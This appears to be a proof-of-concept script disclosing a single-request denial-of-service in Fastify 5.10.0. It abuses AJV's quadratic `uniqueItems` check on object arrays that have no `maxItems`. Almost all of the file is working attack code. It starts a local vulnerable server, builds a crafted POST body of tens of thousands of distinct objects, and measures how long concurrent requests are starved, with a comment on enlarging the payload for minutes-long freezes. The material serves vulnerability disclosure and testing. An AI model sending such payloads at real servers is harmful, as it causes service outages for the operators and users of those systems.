'use strict'
/*
 * PoC — C1: Single-request event-loop-freeze DoS in Fastify 5.10.0
 * ---------------------------------------------------------------------------
 * A route whose body schema declares `uniqueItems: true` on an array of
 * objects (or an array with no scalar `items` type) and no `maxItems` is
 * validated with AJV's O(n^2) `loopN2` (deep equality over every pair).
 * A single ~0.5-1 MB request body (well under the default 1 MB bodyLimit)
 * freezes Node's single event-loop thread for tens of seconds -> the whole
 * server serves nothing else for the duration.
 *
 * Sink: node_modules/ajv/dist/vocabularies/validation/uniqueItems.js (loopN2),
 * driven synchronously from lib/validation.js:123.
 *
 * This script forks a child that runs the vulnerable server, then from the
 * parent it (a) continuously pings /health to measure event-loop
 * responsiveness, and (b) sends ONE malicious POST. The /health pings issued
 * while the POST is being validated hang until validation finishes, proving
 * concurrent requests are starved.
 *
 *   Run:  node poc.js
 */
const path = require('path')
const { fork } = require('child_process')
const http = require('http')

const FASTIFY = path.join(__dirname, '..', '..', 'fastify.js')
const N_ITEMS = 30000 // ~0.37 MB body; raise toward the 1 MB bodyLimit for minutes-long freezes

// --------------------------------------------------------------------------
// CHILD ROLE: the vulnerable server
// --------------------------------------------------------------------------
if (process.env.POC_ROLE === 'server') {
  const Fastify = require(FASTIFY)
  const app = Fastify({ logger: false })

  // A realistic "list of unique records" schema. Note: no `maxItems`, and the
  // array items are objects -> AJV cannot use its O(n) hashed fast path.
  app.post('/ids', {
    schema: {
      body: {
        type: 'object',
        required: ['ids'],
        properties: {
          ids: { type: 'array', uniqueItems: true, items: { type: 'object' } }
        }
      }
    }
  }, async () => ({ ok: true }))

  app.get('/health', async () => ({ up: true }))

  app.listen({ port: 0, host: '127.0.0.1' })
    .then(() => process.send({ port: app.server.address().port }))
    .catch((e) => { console.error('server failed to start', e); process.exit(2) })
  return
}

// --------------------------------------------------------------------------
// PARENT ROLE: attacker + heartbeat monitor
// --------------------------------------------------------------------------
console.log('=== C1 PoC: uniqueItems O(n^2) event-loop-freeze DoS ===\n')

const child = fork(__filename, [], { env: { ...process.env, POC_ROLE: 'server' }, stdio: ['ignore', 'inherit', 'inherit', 'ipc'] })

function ping (port) {
  return new Promise((resolve) => {
    const t0 = Date.now()
    const r = http.get({ host: '127.0.0.1', port, path: '/health', timeout: 60000 }, (res) => {
      res.resume(); res.on('end', () => resolve(Date.now() - t0))
    })
    r.on('error', () => resolve(-1))
    r.on('timeout', () => { r.destroy(); resolve(-1) })
  })
}

child.on('message', async ({ port }) => {
  console.log(`[harness] vulnerable server up on 127.0.0.1:${port}`)

  // Baseline: a healthy /health probe on the idle server.
  console.log(`[harness] baseline /health latency (idle server): ${await ping(port)} ms`)

  // Build the malicious body (~0.37 MB of distinct objects).
  const ids = new Array(N_ITEMS)
  for (let i = 0; i < N_ITEMS; i++) ids[i] = { id: i }
  const payload = JSON.stringify({ ids })
  console.log(`[harness] sending ONE POST /ids  (body ${Math.round(payload.length / 1024)} KB, ${N_ITEMS} items)`)
  console.log('[harness] and, 1s later, a concurrent GET /health from a DIFFERENT connection...\n')

  let postMs = null
  let healthMs = null
  const maybeDone = () => {
    if (postMs === null || healthMs === null) return
    console.log(`\n[harness] POST /ids         -> blocked the event loop for ${postMs} ms`)
    console.log(`[harness] concurrent /health -> took ${healthMs} ms to get a reply (baseline was a few ms)`)
    if (postMs > 2000 && healthMs > postMs / 2) {
      console.log('\n==> VULNERABLE: one small request froze the whole server for tens of seconds.')
      console.log('    The concurrent /health request was starved for essentially the entire freeze,')
      console.log('    proving Node served NO other client during validation. A trickle = permanent outage.')
      process.exit(0)
    } else {
      console.log('\n==> Not clearly reproduced here. Increase N_ITEMS.')
      process.exit(1)
    }
  }

  // Fire a concurrent /health probe 1s in — while the server is mid-validation.
  setTimeout(async () => { healthMs = await ping(port); maybeDone() }, 1000)

  const t0 = Date.now()
  const req = http.request({
    host: '127.0.0.1', port, path: '/ids', method: 'POST',
    headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) }
  }, (res) => {
    res.resume(); res.on('end', () => { postMs = Date.now() - t0; console.log(`[harness] POST /ids -> HTTP ${res.statusCode}`); maybeDone() })
  })
  req.on('error', (e) => { console.log('[harness] request error', e.code); process.exit(1) })
  req.end(payload)
})

setTimeout(() => { console.log('[harness] timeout (300s)'); child.kill('SIGKILL'); process.exit(1) }, 300000)
